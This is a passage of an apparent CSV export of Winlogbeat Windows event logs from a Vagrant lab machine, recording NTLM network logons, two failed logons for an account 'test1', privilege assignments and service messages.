	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","-","-","-","-",0,"192.168.100.10",vagrant,WORKSTATION,"192.168.100.10",45355,MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",NTLM,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",128,"NTLM V2","{00000000-0000-0000-0000-000000000000}","NtLmSsp ",3,"-","-","-","-","-","-","-","-","-","-","-",0x0,"-","S-1-0-0",MANAGER,0x0,0xf8cafa,"-","-","-","-",vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x0,Network,Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31188,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:52:43.132",63kLBIQByII7dpeEWQ1Y,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logon-failed",authentication,4625,"Oct 23, 2022 @ 16:52:44.151","Oct 23, 2022 @ 16:52:43.479",event,failure,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		test1
	Account Domain:		.

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	WORKSTATION
	Source Network Address:	192.168.100.10
	Source Port:		46625

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","-","-","-","-",0,"192.168.100.10",test1,WORKSTATION,"192.168.100.10",46625,".","S-1-0-0",test1,test1,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",NTLM,"-","-","-","-","-","-","-","%%2313","-","-","-","-",0,"-","-","NtLmSsp ",3,"-","-","-","-","-","-","-","-",0xc000006d,0xc0000064,"-",0x0,"-","S-1-0-0",".","-","-","-","-","-","-",test1,"S-1-0-0","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4625,"Audit Failure","Unknown user name or bad password.","This is either due to a bad username or authentication information","User logon with misspelled or bad user account",0x0,Network,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31186,Logon,"-","-","-","-","-"
"Oct 23, 2022 @ 16:52:43.109",6nkLBIQByII7dpeEWQ1Y,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logon-failed",authentication,4625,"Oct 23, 2022 @ 16:52:44.151","Oct 23, 2022 @ 16:52:43.478",event,failure,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account failed to log on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Type:			3

Account For Which Logon Failed:
	Security ID:		S-1-0-0
	Account Name:		test1
	Account Domain:		.

Failure Information:
	Failure Reason:		Unknown user name or bad password.
	Status:			0xC000006D
	Sub Status:		0xC0000064

Process Information:
	Caller Process ID:	0x0
	Caller Process Name:	-

Network Information:
	Workstation Name:	WORKSTATION
	Source Network Address:	192.168.100.10
	Source Port:		32889

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon request fails. It is generated on the computer where access was attempted.

The Subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The Logon Type field indicates the kind of logon that was requested. The most common types are 2 (interactive) and 3 (network).

The Process Information fields indicate which account and process on the system requested the logon.

The Network Information fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The authentication information fields provide detailed information about this specific logon request.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","-","-","-","-",0,"192.168.100.10",test1,WORKSTATION,"192.168.100.10",32889,".","S-1-0-0",test1,test1,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",NTLM,"-","-","-","-","-","-","-","%%2313","-","-","-","-",0,"-","-","NtLmSsp ",3,"-","-","-","-","-","-","-","-",0xc000006d,0xc0000064,"-",0x0,"-","S-1-0-0",".","-","-","-","-","-","-",test1,"S-1-0-0","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4625,"Audit Failure","Unknown user name or bad password.","This is either due to a bad username or authentication information","User logon with misspelled or bad user account",0x0,Network,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31185,Logon,"-","-","-","-","-"
"Oct 23, 2022 @ 16:52:43.069",6XkLBIQByII7dpeEWQ1Y,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-out",authentication,4634,"Oct 23, 2022 @ 16:52:44.151","Oct 23, 2022 @ 16:52:43.477",event,success,"Microsoft-Windows-Security-Auditing",end,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was logged off.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CA10

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.","-","-","-","-","-","-","-","-","-","-",vagrant,"-","-","-",MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"-",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",3,"-","-","-","-","-","-","-","-","-","-","-","-","-","-",MANAGER,"-",0xf8ca10,"-","-","-","-",vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4634,"Audit Success","-","-","-",0xf8ca10,Network,Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31184,Logoff,"-","-","-","-","-"
"Oct 23, 2022 @ 16:52:43.059",53kLBIQByII7dpeEWQ1Y,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:52:44.151","Oct 23, 2022 @ 16:52:43.474",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CA10

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",vagrant,"-","-","-",MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-",MANAGER,0xf8ca10,vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0xf8ca10,"-",Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31182,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:52:43.059",6HkLBIQByII7dpeEWQ1Y,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:52:44.151","Oct 23, 2022 @ 16:52:43.474",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-21-2306022662-2081110232-4248635931-1001
	Account Name:		vagrant
	Account Domain:		MANAGER
	Logon ID:		0xF8CA10
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	WORKSTATION
	Source Network Address:	192.168.100.10
	Source Port:		37353

Detailed Authentication Information:
	Logon Process:		NtLmSsp 
	Authentication Package:	NTLM
	Transited Services:	-
	Package Name (NTLM only):	NTLM V2
	Key Length:		128

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","-","-","-","-",0,"192.168.100.10",vagrant,WORKSTATION,"192.168.100.10",37353,MANAGER,"S-1-5-21-2306022662-2081110232-4248635931-1001",vagrant,vagrant,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",NTLM,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",128,"NTLM V2","{00000000-0000-0000-0000-000000000000}","NtLmSsp ",3,"-","-","-","-","-","-","-","-","-","-","-",0x0,"-","S-1-0-0",MANAGER,0x0,0xf8ca10,"-","-","-","-",vagrant,"S-1-5-21-2306022662-2081110232-4248635931-1001","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x0,Network,Info,656,576,"{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31183,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:52:13.318",4XkKBIQByII7dpeE4Qzh,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16384,"Oct 23, 2022 @ 16:52:13.600","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Successfully scheduled Software Protection service for re-start at 2022-11-22T04:28:12Z. Reason: RulesEngine.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","2022-11-22T04:28:12Z","-","-","-","-",RulesEngine,"-","-","-","-","-","-","-","-","-","-",16384,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4776,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:51:41.843",BXkKBIQByII7dpeEagzQ,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:51:43.152","Oct 23, 2022 @ 16:51:42.414",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31180,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:51:41.843",BnkKBIQByII7dpeEagzQ,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:51:43.152","Oct 23, 2022 @ 16:51:42.415",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31181,"Special Logon","-","-","-","-","-"
"Oct 23, 2022 @ 16:51:37.376",FnkKBIQByII7dpeEVws0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","8.0.0","-","-",16394,"Oct 23, 2022 @ 16:51:38.089","-",event,"-","Microsoft-Windows-Security-SPP","-","-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Offline downlevel migration succeeded.","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",wineventlog,Application,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",16394,Classic,"-","-","-","-","-","-","-","-","{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156}","Microsoft-Windows-Security-SPP",4775,"-","-","-","-","-","-"
"Oct 23, 2022 @ 16:51:37.266",GXkKBIQByII7dpeEVws0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in",authentication,4624,"Oct 23, 2022 @ 16:51:39.094","Oct 23, 2022 @ 16:51:37.391",event,success,"Microsoft-Windows-Security-Auditing",start,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		MANAGER$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x280
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.","-","-","-","-","C:\Windows\System32\services.exe","C:\Windows\System32\services.exe","services.exe","services.exe",640,"-","SYSTEM, MANAGER$","-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-",Negotiate,"-","-","-","-","-","%%1842","-","-","-","%%1833","-","-",0,"-","{00000000-0000-0000-0000-000000000000}","Advapi  ",5,"-","-","-","-","-","-","-","-","-","-",WORKGROUP,0x3e7,"MANAGER$","S-1-5-18","NT AUTHORITY",0x0,0x3e7,"-","-","-","-",SYSTEM,"S-1-5-18","-","-","%%1843","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4624,"Audit Success","-","-","-",0x3e7,Service,Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31178,Logon,"-","-","-","-",2
"Oct 23, 2022 @ 16:51:37.266",GnkKBIQByII7dpeEVws0,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","fc59f618-bd1f-4c86-b56b-ae0c55f14993",Manager,"b003e543-285b-4a6c-9cd6-34119bce7f31",Manager,winlogbeat,"8.1.0","1.12.0","logged-in-special",iam,4672,"Oct 23, 2022 @ 16:51:39.094","Oct 23, 2022 @ 16:51:37.395",event,success,"Microsoft-Windows-Security-Auditing",admin,"-","-","-","-","-","-","-","-","x86_64",Manager,"b697b64b-6a79-4f22-9e29-0e098af54116","fe80::f537:d244:9f19:da0, 192.168.200.10","08:00:27:07:7f:a2",Manager,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Special privileges assigned to new logon.

Subject:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7

Privileges:		SeAssignPrimaryTokenPrivilege
			SeTcbPrivilege
			SeSecurityPrivilege
			SeTakeOwnershipPrivilege
			SeLoadDriverPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeDebugPrivilege
			SeAuditPrivilege
			SeSystemEnvironmentPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","-",SYSTEM,"-","-","-","NT AUTHORITY","S-1-5-18",SYSTEM,SYSTEM,"{218ecdf5-e63b-0001-9cce-8e213be6d801}",wineventlog,Security,Manager,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","SeAssignPrimaryTokenPrivilege, SeTcbPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeAuditPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege","-","-","-","-","-","-","-","-","-","NT AUTHORITY",0x3e7,SYSTEM,"S-1-5-18","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4672,"Audit Success","-","-","-",0x3e7,"-",Info,656,"4,516","{54849625-5478-4994-a5ba-3e3b0328c30d}","Microsoft-Windows-Security-Auditing",31179,"Special Logon","-","-","-","-","-"
